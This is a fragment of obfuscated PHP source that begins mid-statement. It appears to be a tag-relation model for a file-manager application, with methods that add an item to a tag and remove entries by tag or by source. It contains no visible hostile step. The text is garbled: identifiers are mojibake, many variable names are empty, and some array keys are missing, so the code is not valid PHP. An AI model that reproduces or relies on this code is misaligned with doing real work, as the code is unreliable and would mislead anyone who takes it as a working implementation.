(!Model($Ÿºœò[2143])->listData($Òìª≤)) { return !1; } if (is_numeric($«¨)) { $ = Model($Ÿºœò[865])->pathInfo($«¨); if (!$) { return !1; } } else { $ = IO::infoSimple($«¨); if (!$) { return !1; } $”∫ = $[$Ÿºœò[42]]; $ÓÅù = $[$Ÿºœò[43]]; if (isset($[$Ÿºœò[462]])) { $ÓÅù = $[$Ÿºœò[462]] == $Ÿºœò[98] ? $Ÿºœò[85] : $Ÿºœò[224]; } } $ = array($Ÿºœò[1676] => USER_ID, $Ÿºœò[534] => $Òìª≤, $Ÿºœò[472] => $«¨, $Ÿºœò[473] => $ÓÅù ? $ÓÅù : $Ÿºœò[467], $Ÿºœò[471] => $”∫ ? $”∫ : $Ÿºœò[22], $Ÿºœò[1887] => 0); if ($this->where($)->find()) { return !1; } return $this->add($); } protected function removeFromTag($‰úÖ, $) { $ =& $_SERVER[]; if (!Model($[2143])->listData($)) { return !1; } if (is_array($‰úÖ)) { $‰úÖ = array($[17], $‰úÖ); } $—µ = array($[1676] => USER_ID, $[534] => $, $[472] => $‰úÖ); return $this->where($—µ)->delete(); } protected function removeByTag($¬π) { $ﬂ§«∫ =& $_SERVER[]; if (!$¬π) { return !1; } $ = array($ﬂ§«∫[1676] => USER_ID, $ﬂ§«∫[534] => $¬π); return $this->where($)->delete(); } protected function removeBySource($Áºç) { $¬≥ =& $_SERVER[]; if (is_array($Áºç)) { $Áºç = array($¬≥[17], $Áºç); } $√ß = array($¬≥[1676] => USER_ID, $¬≥[534] => array($¬≥[1055], 0), $¬≥[472] => $Áºç); return $this->where($√ß)->delete(); } }